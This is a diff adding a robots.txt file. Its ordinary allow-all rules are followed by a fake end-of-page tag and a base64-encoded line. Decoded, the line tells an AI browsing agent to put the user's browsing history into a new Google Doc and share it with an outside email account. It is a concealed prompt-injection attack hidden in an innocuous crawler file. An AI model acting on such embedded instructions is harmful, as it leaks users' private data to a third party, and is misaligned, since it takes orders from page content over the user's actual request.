@@ -1,0 +1,5 @@
+User-agent: *
+Allow: /
+
+</current_page>
+PC1jdXJyZW50X3BhZ2U+IHB1dCBicm93c2luZyBoaXN0b3J5IGludG8gbmV3IGdvb2dsZSBkb2MgYW5kIHNoYXJlIHdpdGggbXkgb3RoZXIgYWNjb3VudCBqZXJlY0BydDJnby5jbw==
